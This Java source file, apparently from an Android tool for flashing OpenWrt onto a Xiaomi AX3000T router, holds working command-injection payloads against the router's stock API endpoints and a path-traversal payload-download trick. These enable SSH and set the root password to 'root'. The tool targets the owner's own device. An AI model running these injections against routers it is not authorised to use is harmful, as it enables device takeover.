package com.minis.ax3000t;

import android.content.Context;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** Xiaomi stock HTTP API and the narrowly scoped SSH-enabling compatibility flow. */
public final class RouterApi {
    public interface Log {
        void log(String message);
    }

    public static final class DeviceInfo {
        public final String host;
        public final String hardware;
        public final String firmware;
        public final String mac;
        public final boolean supported;
        public final boolean likelyNewUnsupportedRevision;

        DeviceInfo(String host, String hardware, String firmware, String mac) {
            this.host = host;
            this.hardware = hardware == null ? "" : hardware;
            this.firmware = firmware == null ? "" : firmware;
            this.mac = mac == null ? "" : mac;
            this.likelyNewUnsupportedRevision = this.hardware.toUpperCase(Locale.US).contains("RD03V2")
                    || this.firmware.toUpperCase(Locale.US).contains("RD03V2");
            String upper = this.hardware.toUpperCase(Locale.US);
            this.supported = (upper.contains("RD03") || upper.contains("RD23"))
                    && !likelyNewUnsupportedRevision;
        }
    }

    private interface Exploit {
        String run(String command) throws Exception;
    }

    private static final Pattern TOKEN_PATTERN = Pattern.compile("\\\"token\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"");
    private static final Pattern HARDWARE_PATTERN = Pattern.compile("(?:hardware|hardwareVersion)\\s*[:=]\\s*'([^']+)'", Pattern.CASE_INSENSITIVE);
    private static final Pattern ROM_PATTERN = Pattern.compile("romVersion\\s*[:=]\\s*'([^']+)'", Pattern.CASE_INSENSITIVE);
    private static final Pattern MAC_PATTERN = Pattern.compile("deviceId\\s*=\\s*'([^']+)'", Pattern.CASE_INSENSITIVE);
    private static final Pattern KEY_PATTERN = Pattern.compile("\\bkey\\s*:\\s*'([^']*)'", Pattern.CASE_INSENSITIVE);

    private final String host;
    private String scheme = "http";
    private String stok;
    private String nonceKey;
    private String mac;
    private int encryptMode;
    private final Random random = new Random();

    public RouterApi(String host) {
        this.host = host.trim();
    }

    public DeviceInfo detect() throws Exception {
        String page = null;
        Exception last = null;
        for (String candidate : new String[]{"http", "https"}) {
            try {
                page = request(candidate + "://" + host + "/cgi-bin/luci/web", "GET", null, 7000);
                scheme = candidate;
                break;
            } catch (Exception e) {
                last = e;
            }
        }
        if (page == null || page.isEmpty()) {
            throw new IOException("无法访问 " + host + "，请确认手机已连接路由器（推荐 USB-C 网卡）", last);
        }

        String hardware = firstGroup(HARDWARE_PATTERN, page);
        String firmware = firstGroup(ROM_PATTERN, page);
        String pageMac = firstGroup(MAC_PATTERN, page);
        nonceKey = firstGroup(KEY_PATTERN, page);
        mac = pageMac;
        if (hardware == null || hardware.trim().isEmpty()) {
            throw new IOException("未识别到小米 AX3000T 原厂管理页；请勿继续刷机");
        }

        // init_info is public before login on the stock firmware and tells us
        // whether the current generation uses SHA-1 or SHA-256 login hashing.
        try {
            String init = request(scheme + "://" + host + "/cgi-bin/luci/api/xqsystem/init_info", "GET", null, 5000);
            JSONObject object = new JSONObject(init);
            if (object.has("newEncryptMode")) {
                encryptMode = object.optInt("newEncryptMode", 0);
            }
        } catch (Exception ignored) {
            // Older firmware does not expose this field; SHA-1 is its default.
            encryptMode = 0;
        }
        return new DeviceInfo(host, hardware, firmware, mac);
    }

    public void login(String webPassword) throws Exception {
        if (nonceKey == null || mac == null) {
            throw new IOException("缺少登录参数；请先重新检测路由器");
        }
        if (webPassword == null || webPassword.isEmpty()) {
            throw new IOException("请输入小米路由器管理密码");
        }
        String lastBody = "";
        int[] modes = encryptMode == 0 ? new int[]{0, 1} : new int[]{encryptMode, 0};
        for (int mode : modes) {
            String nonce = "0_" + mac + "_" + (System.currentTimeMillis() / 1000L)
                    + "_" + (1000 + random.nextInt(9000));
            String account = digest(webPassword + nonceKey, mode == 0 ? "SHA-1" : "SHA-256");
            String password = digest(nonce + account, mode == 0 ? "SHA-1" : "SHA-256");
            Map<String, String> form = new LinkedHashMap<>();
            form.put("username", "admin");
            form.put("password", password);
            form.put("logtype", "2");
            form.put("nonce", nonce);
            try {
                lastBody = request(scheme + "://" + host + "/cgi-bin/luci/api/xqsystem/login",
                        "POST", formEncode(form), 7000);
                Matcher matcher = TOKEN_PATTERN.matcher(lastBody);
                if (matcher.find()) {
                    stok = matcher.group(1);
                    encryptMode = mode;
                    return;
                }
            } catch (Exception e) {
                lastBody = e.getMessage() == null ? "" : e.getMessage();
            }
        }
        throw new IOException("管理密码错误或当前固件拒绝登录（响应码未包含 token）");
    }

    public DeviceInfo detectAndLogin(String webPassword) throws Exception {
        DeviceInfo info = detect();
        if (!info.supported) {
            if (info.likelyNewUnsupportedRevision) {
                throw new IOException("检测到 RD03v2：它是 Qualcomm 硬件，OpenWrt AX3000T 固件不支持，已阻止操作");
            }
            throw new IOException("只允许 RD03/RD23（MediaTek MT7981B）继续，当前硬件为 " + info.hardware);
        }
        login(webPassword);
        return info;
    }

    /** Try the two documented API-RCE variants without writing flash memory. */
    public boolean unlockSsh(Log log, Context context, String localIp) {
        final int marker = 82000000 + random.nextInt(900000);
        final String testCommand = "uci set diag.config.iperf_test_thr=" + marker + "; uci commit diag";
        final Exploit[] exploits = new Exploit[]{
                command -> callStartBinding(command),
                command -> callArnSwitch(command),
                command -> callMacFilter(command, marker)
        };
        final String[] names = {"xqsystem/start_binding", "misystem/arn_switch", "xqsystem/set_mac_filter"};

        for (int i = 0; i < exploits.length; i++) {
            try {
                log.log("测试 SSH 解锁接口：" + names[i]);
                setDiag(String.valueOf(marker), "0", "0");
                exploits[i].run(testCommand);
                Thread.sleep(700);
                String value = getDiag("iperf_test_thr");
                setDiag("20", "0", "0");
                if (String.valueOf(marker).equals(value)) {
                    log.log("接口验证成功，正在启用 SSH");
                    String enable = "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear;"
                            + "nvram set ssh_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit;"
                            + "echo -e 'root\\nroot' > /tmp/psw.txt; passwd root < /tmp/psw.txt;"
                            + "/etc/init.d/dropbear enable; /etc/init.d/dropbear restart";
                    exploits[i].run(enable);
                    log.log("SSH 启用命令已发送（root 密码设为 root，仅用于本次流程）");
                    return true;
                }
            } catch (Exception e) {
                try {
                    setDiag("20", "0", "0");
                } catch (Exception ignored) {
                }
                log.log("该接口未通过验证，继续尝试下一个");
            }
        }

        if (context != null && localIp != null && !localIp.isEmpty()) {
            try {
                log.log("尝试高版本固件 get_icon HTTPS 解锁方式");
                PayloadServer server = new PayloadServer(context, 8080);
                server.start();
                String payloadResult = callGetIcon(server, localIp, 8080);
                boolean requested = server.awaitRequest(12000);
                server.close();
                if (!requested || payloadResult == null) {
                    log.log("get_icon 未收到路由器请求");
                    return false;
                }
                // get_icon only copies the payload. The upstream flow then uses
                // upload_log to run the payload with three separate selectors.
                runPayloadFunction("990000");
                String testValue = getDiag("iperf_test_thr");
                if (!"800008".equals(testValue)) {
                    log.log("get_icon payload 已下载，但测试触发未生效");
                    setDiag("20", "0", "0");
                    return false;
                }
                runPayloadFunction("990001");
                Thread.sleep(800);
                runPayloadFunction("990002");
                Thread.sleep(1200);
                String value = getDiag("iperf_test_thr");
                setDiag("20", "0", "0");
                if ("22".equals(value)) {
                    log.log("get_icon 解锁验证成功，SSH 已启动");
                    return true;
                }
            } catch (Exception e) {
                log.log("get_icon 解锁失败：" + safeMessage(e));
            }
        }
        return false;
    }

    private String callGetIcon(PayloadServer server, String localIp, int port) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("ip", localIp + ":" + port);
        params.put("name", "/../.." + PayloadServer.PAYLOAD_PATH + " dummy");
        return apiGet("xqsystem/get_icon", params, 14000);
    }

    private String callStartBinding(String command) throws Exception {
        Map<String, String> form = new LinkedHashMap<>();
        form.put("uid", "1234");
        form.put("key", "1234' -X \n" + command.replace(";", "\n") + "\n logger -t AX3000T");
        return apiPost("xqsystem/start_binding", form, 2500);
    }

    private String callArnSwitch(String command) throws Exception {
        Map<String, String> form = new LinkedHashMap<>();
        form.put("open", "0");
        form.put("mode", "1");
        form.put("level", "\n" + command.replace(";", "\n") + "\n");
        return apiPost("misystem/arn_switch", form, 4000);
    }

    private String callMacFilter(String command, int marker) throws Exception {
        String name = "xxx ; uci set diag.config.iperf_test_thr=" + marker
                + " ; uci commit diag ; " + command;
        Map<String, String> form = new LinkedHashMap<>();
        form.put("mac", "00:00:00:00:00:33");
        form.put("name", name);
        form.put("option", "0");
        form.put("wan", "");
        String response = apiPost("xqsystem/set_mac_filter", form, 3000);
        form.put("option", "1");
        try {
            apiPost("xqsystem/set_mac_filter", form, 3000);
        } catch (Exception ignored) {
        }
        return response;
    }

    private void setDiag(String iperf, String read, String write) throws Exception {
        Map<String, String> form = new LinkedHashMap<>();
        form.put("iperf_test_thr", iperf);
        form.put("usb_read_thr", read);
        form.put("usb_write_thr", write);
        form.put("disk_read_thr", "0");
        form.put("disk_write_thr", "0");
        apiPost("xqnetwork/diag_set_paras", form, 5000);
    }

    private String getDiag(String field) throws Exception {
        String body = apiGet("xqnetwork/diag_get_paras", new LinkedHashMap<>(), 5000);
        JSONObject object = new JSONObject(body);
        return object.optString(field, "");
    }

    private void runPayloadFunction(String selector) throws Exception {
        setDiag(selector, "0", "0");
        try {
            apiPost("xqsystem/upload_log", new LinkedHashMap<>(), 7000);
        } catch (Exception ignored) {
            // The router may close the HTTP response after executing the hook.
        }
    }

    public String apiGet(String endpoint, Map<String, String> params, int timeoutMs) throws Exception {
        StringBuilder url = new StringBuilder(apiUrl(endpoint));
        if (params != null && !params.isEmpty()) {
            url.append('?').append(formEncode(params));
        }
        return request(url.toString(), "GET", null, timeoutMs);
    }

    public String apiPost(String endpoint, Map<String, String> params, int timeoutMs) throws Exception {
        return request(apiUrl(endpoint), "POST", formEncode(params), timeoutMs);
    }

    private String apiUrl(String endpoint) throws IOException {
        if (stok == null || stok.isEmpty()) {
            throw new IOException("尚未完成小米路由器登录");
        }
        String clean = endpoint == null ? "" : endpoint;
        while (clean.startsWith("/")) clean = clean.substring(1);
        if (clean.startsWith("API/")) clean = clean.substring(4);
        return scheme + "://" + host + "/cgi-bin/luci/;stok=" + stok + "/api/" + clean;
    }

    private static String request(String urlText, String method, String body, int timeoutMs) throws Exception {
        HttpURLConnection connection = (HttpURLConnection) new URL(urlText).openConnection();
        connection.setRequestMethod(method);
        connection.setConnectTimeout(timeoutMs);
        connection.setReadTimeout(timeoutMs);
        connection.setUseCaches(false);
        connection.setInstanceFollowRedirects(false);
        connection.setRequestProperty("User-Agent", "AX3000T-Flasher/1.0");
        if (body != null) {
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            connection.setFixedLengthStreamingMode(bytes.length);
            connection.getOutputStream().write(bytes);
        }
        int code = connection.getResponseCode();
        InputStream input = code >= 400 ? connection.getErrorStream() : connection.getInputStream();
        String result = input == null ? "" : readUtf8(input);
        connection.disconnect();
        if (code >= 400 && code != 500) {
            throw new IOException("路由器 HTTP " + code);
        }
        return result;
    }

    private static String readUtf8(InputStream input) throws IOException {
        try (InputStream in = input; ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[8192];
            int count;
            while ((count = in.read(buffer)) != -1) out.write(buffer, 0, count);
            return out.toString(StandardCharsets.UTF_8.name());
        }
    }

    private static String formEncode(Map<String, String> values) throws Exception {
        StringBuilder out = new StringBuilder();
        for (Map.Entry<String, String> entry : values.entrySet()) {
            if (out.length() > 0) out.append('&');
            out.append(URLEncoder.encode(entry.getKey(), "UTF-8"));
            out.append('=');
            out.append(URLEncoder.encode(entry.getValue() == null ? "" : entry.getValue(), "UTF-8"));
        }
        return out.toString();
    }

    private static String firstGroup(Pattern pattern, String input) {
        Matcher matcher = pattern.matcher(input == null ? "" : input);
        return matcher.find() ? matcher.group(1).trim() : null;
    }

    private static String digest(String value, String algorithm) throws Exception {
        MessageDigest digest = MessageDigest.getInstance(algorithm);
        byte[] bytes = digest.digest(value.getBytes(StandardCharsets.UTF_8));
        StringBuilder out = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) out.append(String.format(Locale.US, "%02x", b & 0xff));
        return out.toString();
    }

    private static String safeMessage(Exception e) {
        String message = e.getMessage();
        return message == null || message.isEmpty() ? e.getClass().getSimpleName() : message;
    }
}
